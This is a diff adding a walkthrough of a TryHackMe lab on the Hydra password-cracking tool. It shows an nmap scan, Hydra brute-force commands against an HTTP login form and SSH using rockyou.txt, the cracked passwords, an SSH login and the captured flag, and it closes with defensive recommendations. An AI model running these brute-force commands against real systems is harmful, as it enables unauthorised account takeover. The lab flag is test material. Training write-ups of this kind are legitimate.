@@ -1,0 +1,297 @@
+Introduction
+
+In this lab from TryHackMe, we learn how to use Hydra, a powerful password-cracking tool used in penetration testing. Hydra performs brute force attacks against login services such as SSH, FTP, HTTP, and others.
+
+The goal of this lab is to understand how attackers attempt to guess credentials and how security professionals test systems for weak passwords.
+
+Objective
+
+The objective of this lab is to:
+
+Learn what Hydra is
+
+Understand brute force attacks
+
+Use Hydra to crack login credentials
+
+Gain access to a vulnerable service
+
+What is Hydra
+
+Hydra is a fast and flexible online password cracking tool used by penetration testers.
+
+Hydra supports many protocols including:
+
+SSH
+
+FTP
+
+HTTP
+
+SMTP
+
+Telnet
+
+RDP
+
+It works by testing multiple username and password combinations until the correct credentials are found.
+
+Lab Environment
+
+Platform: TryHackMe
+Attack Machine: Kali Linux
+Target: Vulnerable login service
+
+Tools Used:
+
+Hydra
+
+Wordlists
+
+Terminal
+
+Step 1: Access the Lab Machine
+
+First, start the machine provided in the lab and connect to the AttackBox or your local Kali Linux machine.
+
+Check if Hydra is installed:
+
+hydra -h
+
+If Hydra is installed, the help menu will appear.
+
+Step 2: Identify the Target Service
+
+Before performing a brute force attack, we must identify the service running on the target machine.
+
+Example:
+
+nmap <target-ip>
+
+This helps identify open ports and services such as SSH or FTP.
+nmap -sS -A 10.49.131.149 -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-16 12:05 IST
+Nmap scan report for 10.49.131.149
+Host is up (0.060s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 45:20:13:7b:35:7f:35:a6:34:50:4f:0d:c0:fb:a4:9e (RSA)
+|   256 d6:21:17:1e:db:c8:cb:7b:ca:85:11:c4:14:c2:8d:36 (ECDSA)
+|_  256 77:86:bb:c9:19:6a:96:d1:e2:b8:fe:48:65:26:64:8b (ED25519)
+80/tcp open  http    Node.js Express framework
+| http-title: Hydra Challenge
+|_Requested resource was /login
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=3/16%OT=22%CT=1%CU=36122%PV=Y%DS=3%DC=T%G=Y%TM=69B7A4C
+OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%
+OS:CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%G
+OS:CD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4
+OS:E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
+OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%C
+OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
+OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
+OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
+OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
+OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 111/tcp)
+HOP RTT       ADDRESS
+1   107.45 ms 192.168.128.1
+2   ...
+3   108.39 ms 10.49.131.149
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.07 seconds
+
+Step 3: Prepare Username and Password Lists
+
+Hydra uses wordlists to attempt login combinations.
+
+Example username list:
+
+users.txt
+
+Example password list:
+
+passwords.txt
+
+Common wordlists can be found in Kali:
+
+/usr/share/wordlists/
+
+One popular list is rockyou.txt.
+
+Step 4: Perform Brute Force Attack
+
+Now we use Hydra to attack the service.
+
+Example command:
+
+hydra -l admin -P passwords.txt ssh://<target-ip>
+
+Explanation:
+
+-l → single username
+
+-P → password list
+
+ssh:// → target protocol
+
+Hydra will now start testing passwords from the wordlist.
+ hydra -l  molly -P /usr/share/wordlists/rockyou.txt 10.49.131.149  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-16 12:18:14
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.49.131.149:80/login:username=^USER^&password=^PASS^:F=incorrect
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "princess" - 6 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "654321" - 17 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "michael" - 18 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "ashley" - 19 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "qwerty" - 20 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "111111" - 21 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "iloveu" - 22 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "000000" - 23 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "michelle" - 24 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "tigger" - 25 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "sunshine" - 26 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "chocolate" - 27 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "password1" - 28 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "soccer" - 29 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "anthony" - 30 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "friends" - 31 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "butterfly" - 32 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "purple" - 33 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "angel" - 34 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "jordan" - 35 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.49.131.149 - login "molly" - pass "liverpool" - 36 of 14344399 [child 10] (0/0)
+[80][http-post-form] host: 10.49.131.149   login: molly   password: sunshine
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-16 12:18:28
+
+SSH :
+molly -P /usr/share/wordlists/rockyou.txt  10.49.131.149 -t 4 ssh                               
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-16 12:19:47
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.49.131.149:22/
+[22][ssh] host: 10.49.131.149   login: molly   password: butterfly
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-16 12:20:15
+
+
+Step 5: Successful Login
+
+After several attempts, Hydra finds the correct password.
+
+Example output:
+
+[22][ssh] host: <target-ip> login: admin password: password123
+
+This means the correct credentials have been discovered.
+
+Step 6: Login to the Target
+
+Using the discovered credentials, we can now access the system.
+
+Example:
+
+ssh admin@<target-ip>
+
+Enter the password found by Hydra.
+
+You should now have access to the system.
+ ssh molly@10.49.131.149
+The authenticity of host '10.49.131.149 (10.49.131.149)' can't be established.
+ED25519 key fingerprint is: SHA256:YFHEoX4xz6WIkqKvr4wrwmD2RjN8kH9DdiWRC8Jtn6o
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.49.131.149' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+molly@10.49.131.149's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1083-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Mon 16 Mar 2026 06:50:17 AM UTC
+
+  System load:  0.0                Processes:             115
+  Usage of /:   18.3% of 14.47GB   Users logged in:       0
+  Memory usage: 24%                IPv4 address for ens5: 10.49.131.149
+  Swap usage:   0%
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+7 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
+molly@ip-10-49-131-149:~$ ls
+flag2.txt
+molly@ip-10-49-131-149:~$ cat flag2.txt
+THM{c8eeb0468febbadea859baeb33b2541b}
+molly@ip-10-49-131-149:~$ Connection to 10.49.131.149 closed by remote host.
+Connection to 10.49.131.149 closed.
+
+
+Key Concepts Learned
+
+Understanding brute force attacks
+
+Using Hydra for password cracking
+
+Importance of strong passwords
+
+Identifying weak authentication systems
+
+Security Recommendations
+
+To prevent brute force attacks:
+
+Use strong passwords
+
+Enable account lockout policies
+
+Implement multi-factor authentication
+
+Monitor login attempts
+
+Conclusion
+
+This lab demonstrated how attackers can exploit weak passwords using Hydra. Security professionals can use this tool during penetration testing to identify weak authentication systems and improve security.
+
+Learning tools like Hydra helps us understand both offensive and defensive cybersecurity techniques. 
